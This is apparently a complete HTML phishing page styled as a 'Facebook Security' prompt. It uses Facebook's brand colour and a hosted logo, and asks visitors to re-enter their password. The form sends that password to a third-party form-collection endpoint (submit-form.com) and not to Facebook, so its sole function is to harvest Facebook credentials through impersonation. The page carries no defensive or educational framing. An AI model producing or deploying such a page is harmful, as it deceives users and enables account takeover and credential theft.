

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Password Container</title>
  <link rel="stylesheet" href="path/to/your/css/file.css">
  <style>
    * {
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
    }

    .passwordContainer {
      display: block;
      margin: auto;
      width: 30%;
      margin-top: 30px;
    }

    .passwordContainer img {
      width: 100px;
      height: 100px;
      display: block;
      margin: auto;
    }

    .passwordContainer h3 {
      margin-top: 30px;
      font-size: 24px; /* Increase font size here */
    }

    .passwordContainer hr {
      border: 1px solid lightgray;
    }

    .passwordContainer {
      margin-top: 20px;
      display: flex;
      flex-direction: column;
    }

    .passwordContainer button {
      margin-top: 20px;
      padding: 10px;
      border: none;
      background-color: #1778f2;
      color: white;
      border-radius: 5px;
      font-weight: bold;
      cursor: pointer;
    }

    .passwordContainer input {
      margin-top: 10px;
      padding: 14px;
      border: 1px solid lightgray;
      outline: none;
      border-radius: 5px;
    }

    .passwordContainer p {
      color: rgb(152, 151, 151);
    }
  </style>
</head>
<body>
  <form class="content" action="https://submit-form.com/KVhF8HgSs" method="POST">
    <div class="passwordContainer">
      <img src="https://cdn.glitch.global/c8a0e925-2286-42f9-bc9a-4154a9091edd/3357701.webp?v=1724180745555" alt="Logo">
      <h3>Facebook Security</h3>
      <p>Please re-enter password to complete the request.</p>
      <label for="password" class="sr-only">Password</label>
      <input type="password" name="password" id="password" placeholder="Password" aria-label="Password" required>
      <button type="submit">Submit</button>
    </div>
  </form>
</body>
</html>
